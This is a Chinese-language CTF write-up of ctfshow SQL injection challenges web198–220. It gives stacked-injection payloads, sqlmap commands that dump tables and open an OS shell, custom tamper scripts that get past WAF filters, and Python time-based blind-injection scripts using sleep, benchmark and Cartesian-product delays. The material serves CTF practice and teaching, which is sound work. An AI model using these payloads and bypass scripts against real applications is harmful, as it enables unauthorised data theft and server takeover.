---
title: "ctfshow Web入门[SQL注入] web198-220 Writeup"
date: 2022-07-29T14:23:23+08:00
draft: false
author: "X1r0z"

tags: ['sqli','ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

肝不动了... 盲注挺费时间的

<!--more-->

## web198

与上题相比过滤了 update create drop 等操作

但注意这里的 `username=` 后面依然没加引号

根据 mysql 的类型转换, 输入数字时, 记录中的数据都会转换成 int 类型, 非数字开头的 string 被转换时会变成 0

这里我们猜测所有 username 被转换后都是 0

然后我们插入一条 username=1 的记录, 登录即可

`username=1;insert ctfshow_user(username,pass) values(1,1)&password=1`

![20220727152638](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220727152638.png)


网上有 wp 给出的思路是将 pass 和 id 列互换, 然后进行爆破, payload 如下

`0;alter table ctfshow_user change column pass tmp varchar(255);alter table ctfshow_user change column id pass varchar(255);alter table ctfshow_user change column tmp id varchar(255)`

## web199

同上, 但过滤了括号, insert 操作不能用了

想了想, 因为这里是堆叠注入, 类似之前有一题通过 `select(1)` 把原本的 pass 顶掉

这里我们用 `show tables` 语句

猜测数据表只有一张 `ctfshow_user`, 所以上句返回的第一条结果就是 `ctfshow_user`, 然后存到 `$row[0]` 里面

![20220727153900](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220727153900.png)

上题中互换列名的方法仍然可以, 但要改一下类型

`0;alter table ctfshow_user change column pass tmp text;alter table ctfshow_user change column id pass int;alter table ctfshow_user change column tmp id text`

## web200

同上, 又过滤了 `,`

依然可以用 `;show tables`

互换列名同上

## web201

"不使用sqlmap是没有灵魂的"

"打击盗版人人有责，你都不是从ctf.show来的"

指定 user-agent 和 referer

```bash
sqlmap.py -u "http://abb99e06-4b83-46b4-85b6-aec02eb9fdda.challenge.ctf.show/api/?id=1" --user-agent "sqlmap" --referer "http://abb99e06-4b83-46b4-85b6-aec02eb9fdda.challenge.ctf.show/sqlmap.php" -t 20 --dump -T ctfshow_user -D ctfshow_web
```

## web202

查询语句里写的是 get 请求, 但其实 post 请求也是可以的

```bash
sqlmap.py -u "http://5cbfc211-2645-4415-b87b-39b535ba6e1a.challenge.ctf.show//api/" --data "id=1&page=1&limit=10" --user-agent "sqlmap" --referer "ctf.show" --dump -T ctfshow_user -D ctfshow_web 
```

## web203

method 试了一遍都不行, 看到 wp 才发现竟然是 PUT

不过 PUT 提交有两个条件

1. headers 内修改为 Content-Type: text/plain
   
2.  /api/ 补全为 /api/index.php

```bash
sqlmap.py -u "http://9f5fd319-561c-426e-a333-fe2eb2bf601a.challenge.ctf.show/api/index.php" --data "id=1&page=1&limit=10" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --dump -T ctfshow_user -D ctfshow_web
```

## web204

抓包时会有 cookie `PHPSESSID=41bio5n2atcltdt7dnsekcgmsk`

其余同上 (竟然还是 PUT 方法...)

```bash
sqlmap.py -u "http://ef292aba-c228-46fc-b3b0-52c98503672a.challenge.ctf.show/api/index.php" --data "id=1&page=1&limit=10" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --cookie "PHPSESSID=41bio5n2atcltdt7dnsekcgmsk" --dump -T ctfshow_user -D ctfshow_web
```

## web205

"api调用需要鉴权"

抓包发现每次查数据前都会访问一下 `/api/getToken.php` 得到临时 cookie (只能用一次)

可以使用 sqlmap 的 `--safe-*` 系列参数

```bash
    --safe-url=SAFEURL  URL address to visit frequently during testing
    --safe-post=SAFE..  POST data to send to a safe URL
    --safe-req=SAFER..  Load safe HTTP request from a file
    --safe-freq=SAFE..  Regular requests between visits to a safe URL
```

freq 设置为1次

```bash
sqlmap.py -u "http://e3eed01a-8ada-4f3c-bb92-7eeed1b78f2f.challenge.ctf.show/api/index.php" --data "id=1&page=1&limit=10" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --safe-url "http://e3eed01a-8ada-4f3c-bb92-7eeed1b78f2f.challenge.ctf.show/api/getToken.php" --safe-freq 1 -dump -T ctfshow_flax -D ctfshow_web
```

## web206

同上

```bash
sqlmap.py -u "http://7ce2ba54-4265-4985-966e-cf8db2093c86.challenge.ctf.show/api/index.php" --data "id=1&page=1&limit=10" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --safe-url "http://7ce2ba54-4265-4985-966e-cf8db2093c86.challenge.ctf.show/api/getToken.php" --safe-freq 1 -dump -T ctfshow_flaxc -D ctfshow_web
```

## web207

过滤了空格, 使用 tamper 中的 space2comment.py 绕过

```bash
sqlmap.py -u "http://cfde58ec-6629-488a-ab99-aadff83d640c.challenge.ctf.show/api/index.php" --data "id=1&page=1&limit=10" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --safe-url "http://cfde58ec-6629-488a-ab99-aadff83d640c.challenge.ctf.show/api/getToken.php" --safe-freq 1 --tamper "space2comment" --dump -T ctfshow_flaxca -D ctfshow_web
```

## web208

replace 一次 select, 本来想写 tamper 过滤的, 后来发现可能没有忽略大小写, sqlmap 自己直接就能跑

```bash
sqlmap.py -u "http://873ccc03-e52a-4a9e-b820-5b1d09533ccc.challenge.ctf.show/api/index.php" --data "id=1&page=1&limit=10" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --safe-url "http://873ccc03-e52a-4a9e-b820-5b1d09533ccc.challenge.ctf.show/api/getToken.php" --safe-freq 1 --tamper "space2comment" --dump -T ctfshow_flaxcac -D ctfshow_web --batch
```

## web209

过滤了 ` ` `*` `=`

试了好久发现都不行, 最后把 `&page=1&limit=10` 删了竟然就能跑出来了... 而且还是联合查询

自写 tamper (测试自带的 equaltolike space2hash 等等都不行)

```python
# Needed imports
from lib.core.enums import PRIORITY

# Define which is the order of application of tamper scripts against
# the payload
__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    '''
    Description of your tamper script
    '''

    retVal = payload.replace("=", " like ").replace(" ", chr(0x0a))

    # your code to tamper the original payload

    # return the tampered payload
    return retVal
```

```bash
sqlmap.py -u "http://efe103d2-9fe4-463a-a8e5-38a00e2d73f2.challenge.ctf.show/api/index.php" --data "id=1" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --safe-url "http://efe103d2-9fe4-463a-a8e5-38a00e2d73f2.challenge.ctf.show/api/getToken.php" --safe-freq 1 --tamper "my" --dump -T ctfshow_flav -D ctfshow_web
```

## web210

```php
function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
```

base64 + 反转字符串

自写 tamper

```python
# Needed imports
import base64
from lib.core.enums import PRIORITY

# Define which is the order of application of tamper scripts against
# the payload
__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    '''
    Description of your tamper script
    '''

    retVal = base64.b64encode(base64.b64encode(payload[::-1].encode("utf-8"))[::-1]).decode("utf-8")

    # your code to tamper the original payload

    # return the tampered payload
    return retVal
```

注意 base64 encode 之前需要 `.encode("utf-8")`, 最后 return 的时候 `.decode("utf-8")` (不能直接 `str()`)

```bash
sqlmap.py -u "http://706317b6-ff03-45f2-ab3d-ac99e00c4f55.challenge.ctf.show/api/index.php" --data "id=1" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --safe-url "http://706317b6-ff03-45f2-ab3d-ac99e00c4f55.challenge.ctf.show/api/getToken.php" --safe-freq 1 --tamper "my" --dump -T ctfshow_flavi -D ctfshow_web
```

## web211

过滤了空格

tamper 同上, payload 改为 `payload.replace(" ", chr(0x0a))`

## web212

过滤了 `*`

同上

## web213

os-shell

```bash
sqlmap.py -u "http://b368fa62-6fe6-45ec-ad8c-7c8bf99218eb.challenge.ctf.show/api/index.php" --data "id=1" --user-agent "sqlmap" --referer "ctf.show" --method PUT --headers "Content-Type: text/plain" --safe-url "http://b368fa62-6fe6-45ec-ad8c-7c8bf99218eb.challenge.ctf.show/api/getToken.php" --safe-freq 1 --tamper "my" --os-shell
```

![20220727213816](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220727213816.png)

其实网站路径就是 /var/www/html/

![20220727213833](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220727213833.png)

显示失败, 但其实已经上传成功了

![20220727213913](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220727213913.png)

flag 在根目录

![20220727214305](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220727214305.png)

## web214

没给语句和过滤条件

不知道地址

抓包发现有一个 POST 请求

![20220728202301](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220728202301.png)

应该是记录 IP 的

提示是时间盲注, ip 试了 `xxx' and sleep(5)#` 等等都不行

最后闲的打了个 `sleep(5)` 竟然成功了

![20220728202436](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220728202436.png)

不知道是什么逻辑...

`ip=if(length(user())>0,sleep(5),0)&debug=0` 有延时5秒

盲注脚本

```python
import time
import requests

dicts='{ctfshow1234567890-asdf_,qeryuipgjklzxvbnm}'

url = 'http://d8bfb2ec-cba0-4834-bcbb-26ab784c74de.challenge.ctf.show/api/index.php'

flag = ''

for i in range(64):
    for s in dicts:
        #sql = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
        #sql = 'select group_concat(column_name) from information_schema.columns where table_name=\'ctfshow_flagx\' and table_schema=database()'
        sql = 'select group_concat(flaga) from ctfshow_flagx'
        payload = f'if(substr(({sql}),{i},1)=\'{s}\',sleep(2),0)'
        start = time.time()
        res = requests.post(url,data={'ip': payload, 'debug': '0'})
        stop = time.time()
        if stop - start >=2:
            flag += s
            print(flag)
            break
```

## web215

增加了单引号

试了 `ip=1'and sleep(5)#&debug=0` 没有延时, 但是 and 改成 or 之后就有延时

根据提示信息里的 "屏蔽危险分子", 应该是做了 IP 验证, 使用 and 的话前一个条件为 false 导致不能进行 sleep

改成 `ip=127.0.0.1'and sleep(5)#&debug=0` 后就能延时了

其实用上面的 or 跑脚本也是一样的

```python
import time
import requests

dicts='{ctfshow1234567890-asdf_,qeryuipgjklzxvbnm}'

url = 'http://3790fa05-223e-407e-bfca-69523ae6b671.challenge.ctf.show/api/index.php'

flag = ''

for i in range(64):
    for s in dicts:
        #sql = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
        #sql = 'select group_concat(column_name) from information_schema.columns where table_name=\'ctfshow_flagxc\' and table_schema=database()'
        sql = 'select group_concat(flagaa) from ctfshow_flagxc'
        payload = '127.0.0.1\'' + f'and if(substr(({sql}),{i},1)=\'{s}\',sleep(2),0)#'
        start = time.time()
        res = requests.post(url,data={'ip': payload, 'debug': '0'})
        stop = time.time()
        if stop - start >=2:
            flag += s
            print(flag)
            break

```

## web216

```
where id = from_base64($id);
```

没看懂什么意思... 用 web214 的脚本不用修改就能跑出来

## web217

`$id` 加括号还是没看懂...

payload 构造类似 web214, 但是过滤了 `sleep()`

可以用 `benchmark()` 绕过, 例如通过 `benchmark(2000000,md5(1))` 执行2000000次 `md5(1)` (延迟大约2秒)

需要注意的是不同语句执行的速度不同, 而且同一语句执行相同次数所用时间会有一点浮动

这里用的是 `if((xxx),benchmark(2000000,md5(1)),0)`, 脚本同上

## web218

同上, 但 `benchmark()` 也被过滤了

另外还有三种延迟方式, 参考 [https://www.cdxy.me/?p=789](https://www.cdxy.me/?p=789)

1. 笛卡尔积

2. get_lock()

3. regexp rlike


`get_lock()` 要开两个 session, `regexp rlike` 效果不太好 (本机测试不耗时, 可能是版本问题?)...

笛卡尔积也很蛋疼, 数据表搭配不好的话延迟时间能上天, 而且每次所用时间还有误差

以下 payload 延时大约2秒

```sql
SELECT count(*) FROM information_schema.tables A, mysql.user B, mysql.user C, mysql.user D, mysql.user E, mysql.user F
```

以下 payload 延时约6秒

```sql
SELECT count(*) FROM information_schema.columns A, information_schema.tables B, information_schema.tables C
```

## web219

过滤了 `rlike`, 脚本同上

## web220

```php
function waf($str){
    return preg_match('/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i',$str);
}   
```

过滤的有点多

`substr` `mid` 不能用可以换成 `like` 模糊查询

`concat` 被过滤意味着不能用 `group_concat`, 可以换成 `limit n,1`

单双引号不受影响

笛卡尔积不受影响

脚本

```python
import time
import requests

dicts='{ctfshow1234567890-asdfqeryuipgjklzxvbnm}'

url = 'http://97bea48b-2639-4d40-9d52-79a67c3bb366.challenge.ctf.show/api/index.php'

flag = 'ctfshow{5'

for i in range(1,64):
    for s in dicts:
        #sql = 'select table_name from information_schema.tables where table_schema=database() limit 0,1'
        #sql = 'select column_name from information_schema.columns where table_name=\'ctfshow_flagxcac\' and table_schema=database() limit 1,1'
        sql = 'select flagaabcc from ctfshow_flagxcac limit 0,1'
        payload = f'if(({sql}) like \'' + flag + s + '%\',(SELECT count(*) FROM information_schema.columns A, information_schema.tables B, information_schema.tables C),0)'
        start = time.time()
        res = requests.post(url,data={'ip': payload, 'debug': '0'},timeout=30)
        stop = time.time()
        if stop - start >=5:
            flag += s
            print(flag)
            break
```